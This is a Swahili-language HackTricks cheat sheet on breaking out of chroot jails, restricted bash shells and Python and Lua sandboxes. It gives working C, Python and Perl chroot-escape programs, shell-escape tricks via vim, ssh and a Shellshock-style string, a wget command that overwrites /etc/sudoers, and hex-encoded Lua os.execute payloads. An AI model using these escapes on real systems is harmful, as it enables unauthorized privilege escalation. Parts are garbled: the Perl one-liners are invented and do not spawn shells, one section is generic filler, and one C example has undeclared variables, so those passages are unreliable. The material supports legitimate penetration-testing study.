# Kutoroka Kutoka Jela

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **GTFOBins**

**Tafuta kwenye** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **kama unaweza kutekeleza faili yoyote na sifa ya "Shell"**

## Kutoroka Kutoka Chroot

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mfumo wa chroot **haukusudiwi kulinda** dhidi ya kuingiliwa kwa makusudi na watumiaji wenye **mamlaka** (**root**). Kwenye mifumo mingi, muktadha wa chroot hauna uwezo wa kushughulikia vizuri na programu zilizofungwa kwenye chroot **zinazoweza kufanya chroot ya pili kuvunja**.\
Kawaida hii inamaanisha kuwa ili kutoroka, unahitaji kuwa root ndani ya chroot.

{% hint style="success" %}
**Zana** [**chw00t**](https://github.com/earthquake/chw00t) iliumbwa ili kutumia mazingira yafuatayo na kutoroka kutoka `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Ikiwa wewe ni **root** ndani ya chroot unaweza **kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroot 2 haziwezi kuwepo (katika Linux), kwa hivyo ikiwa unatengeneza saraka na kisha **kuunda chroot mpya** kwenye saraka hiyo mpya ukiwa **nje yake**, sasa utakuwa **nje ya chroot mpya** na kwa hivyo utakuwa kwenye FS.

Hii hutokea kwa sababu kawaida chroot HAIHAMISHI saraka yako ya kazi kwenye ile iliyotajwa, kwa hivyo unaweza kuunda chroot lakini uwe nje yake.
{% endhint %}

Kawaida hutapata faili ya `chroot` ndani ya jela ya chroot, lakini **unaweza kusanidi, kupakia na kutekeleza** faili ya binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Perl ni lugha ya programu ambayo inaweza kutumika kwa kusudi la kutoroka kutoka kwenye mazingira ya bash iliyopunguzwa. Hapa kuna njia kadhaa za kufanya hivyo:

1. Kutumia Perl kwa kutekeleza amri za shell:
```perl
perl -e 'exec "/bin/sh";'
```

2. Kutumia Perl kwa kutekeleza amri za shell kwa kutumia mchanganyiko wa amri za Perl na amri za shell:
```perl
perl -e 'system("/bin/sh");'
```

3. Kutumia Perl kwa kutekeleza amri za shell kwa kutumia mchanganyiko wa amri za Perl na amri za shell, na kuficha matokeo:
```perl
perl -e 'open(STDIN, "/bin/sh");'
```

4. Kutumia Perl kwa kutekeleza amri za shell kwa kutumia mchanganyiko wa amri za Perl na amri za shell, na kuficha matokeo na kuingiza amri za shell ndani ya programu ya Perl:
```perl
perl -e '$0="/bin/sh";'
```

Kwa kutumia njia hizi, unaweza kutoroka kutoka kwenye mazingira ya bash iliyopunguzwa na kupata ufikiaji wa juu zaidi.
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Mzizi + FD iliyohifadhiwa

{% hint style="warning" %}
Hii ni sawa na kesi iliyotangulia, lakini katika kesi hii **mshambuliaji anahifadhi faili descriptor kwa saraka ya sasa** na kisha **anajenga chroot katika saraka mpya**. Hatimaye, kwa kuwa ana **upatikanaji** wa **FD** hiyo **nje** ya chroot, anaiingia na **kutoroka**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD inaweza kupitishwa kupitia Unix Domain Sockets, hivyo:

* Unda mchakato wa mtoto (fork)
* Unda UDS ili mzazi na mtoto waweze kuongea
* Chalisha chroot katika mchakato wa mtoto katika saraka tofauti
* Katika mzazi proc, unda FD ya saraka ambayo iko nje ya chroot mpya ya mtoto
* Pita kwa mtoto procc FD hiyo kwa kutumia UDS
* Mtoto mchakato chdir kwa FD hiyo, na kwa sababu iko nje ya chroot yake, atatoka gerezani
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* Kufunga kifaa cha mizizi (/) katika saraka ndani ya chroot
* Kufunga katika saraka hiyo

Hii inawezekana katika Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Funga procfs katika saraka ndani ya chroot (ikiwa bado haijafungwa)
* Tafuta pid ambayo inaingia tofauti ya mizizi/cwd, kama: /proc/1/root
* Chroot katika kuingia hiyo
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Unda Fork (mtoto proc) na chroot katika saraka tofauti zaidi katika FS na CD juu yake
* Kutoka kwa mchakato wa mzazi, hamisha saraka ambapo mchakato wa mtoto iko katika saraka kabla ya chroot ya watoto
* Mchakato huu wa watoto atajikuta nje ya chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Muda uliopita watumiaji wangeweza kudebugi michakato yao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii haiwezekani kwa chaguo-msingi tena
* Hata hivyo, ikiwa inawezekana, unaweza kufuatilia mchakato na kutekeleza shellcode ndani yake ([angalia mfano huu](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Uchunguzi

Pata habari kuhusu gereza:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Badilisha NJIA

Angalia ikiwa unaweza kubadilisha kipengele cha mazingira cha NJIA (PATH)
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim

Vim ni mhariri wa maandishi unaopatikana kwenye mifumo mingi ya Linux. Inaweza kutumiwa kwa ufanisi katika kutoroka kutoka kwenye mazingira ya bash yaliyopunguzwa. Hapa kuna hatua za kufuata:

1. Fungua terminal na uingie kwenye akaunti ya mtumiaji mdogo.
2. Chukua jina la faili la kikao cha bash kilichopunguzwa na uandike kwenye kumbukumbu.
3. Tumia amri `vim` kufungua mhariri wa vim.
4. Ndani ya vim, bonyeza `:` kuingia kwenye mode ya amri.
5. Andika `set shell=/bin/bash` na bonyeza Enter ili kuweka shell ya vim kuwa bash.
6. Kisha andika `shell` na bonyeza Enter ili kutekeleza amri ya shell.
7. Utakuwa sasa umepata shell ya bash iliyopanuliwa na uwezo wa kutekeleza amri zote za bash.

Kwa kufuata hatua hizi, unaweza kutumia vim kutoroka kutoka kwenye mazingira ya bash yaliyopunguzwa na kupata ufikiaji wa juu wa mifumo ya Linux.
```bash
:set shell=/bin/sh
:shell
```
### Unda skripti

Angalia kama unaweza kuunda faili inayoweza kutekelezwa na maudhui ya _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kutoka kwa SSH

Ikiwa unatumia ssh, unaweza kutumia hila hii ili kutekeleza kikasha cha bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Tangaza

Kuweka mazingira salama kwenye mfumo wa Linux ni muhimu sana ili kuzuia watu wasiohitajika kufikia rasilimali zako za mtandao. Hata hivyo, kuna njia ambazo mtu anaweza kutumia kuvunja vizuizi na kupata ufikiaji wa kiwango cha juu kwenye mfumo wako. Mbinu hii inajulikana kama "kupanda kutoka kwenye Bash iliyopunguzwa".

Kwa kawaida, wakati mtumiaji anapokuwa amepunguzwa kwenye Bash iliyopunguzwa, kuna vizuizi kadhaa ambavyo vinazuia ufikiaji wa kiwango cha juu. Hata hivyo, kuna njia kadhaa za kuzunguka vizuizi hivi na kupata ufikiaji wa kiwango cha juu.

Moja ya njia hizo ni kwa kutumia mbinu ya "kupanda kutoka kwenye Bash iliyopunguzwa" ambayo inahusisha kutumia mbinu za kubadilisha mazingira ya Bash ili kuondoa vizuizi na kupata ufikiaji wa kiwango cha juu.

Kuna njia kadhaa za kufanya hivyo, ikiwa ni pamoja na kubadilisha PATH, kubadilisha SHELL, kubadilisha LD_PRELOAD, na kutumia mbinu za kubadilisha mazingira ya Bash.

Ni muhimu kuelewa kwamba mbinu hizi zinaweza kuwa hatari na zinapaswa kutumiwa tu kwa madhumuni ya kujifunza au kwa idhini ya mmiliki wa mfumo. Kwa kuongezea, ni muhimu kufuata sheria na kanuni zote zinazohusiana na usalama wa mtandao wakati wa kufanya mbinu hizi.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Unaweza kubadilisha faili ya sudoers kwa mfano
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Mbinu nyingine

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Pia inaweza kuwa ya kuvutia ukurasa huu:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Jela za Python

Mbinu za kutoroka kutoka kwa jela za python zinapatikana kwenye ukurasa ufuatao:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Jela za Lua

Kwenye ukurasa huu unaweza kupata kazi za jumla ambazo unaweza kuzitumia ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval na utekelezaji wa amri:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Baadhi ya mbinu za **kuita kazi za maktaba bila kutumia alama za nukta**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Panga kazi za maktaba:
```bash
for k,v in pairs(string) do print(k,v) end
```
Tafadhali kumbuka kuwa kila wakati unapotekeleza amri ya awali katika **mazingira tofauti ya lua, utaratibu wa kazi hubadilika**. Kwa hivyo, ikiwa unahitaji kutekeleza kazi fulani maalum, unaweza kufanya shambulio la nguvu kwa kupakia mazingira tofauti ya lua na kuita kazi ya kwanza ya maktaba ya le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata kikao cha lua cha kuingiliana**: Ikiwa uko ndani ya kikao cha lua kilichopunguzwa, unaweza kupata kikao kipya cha lua (na matumaini yasiyokuwa na kikomo) kwa kuita:
```bash
debug.debug()
```
## Marejeo

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Majedwali: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
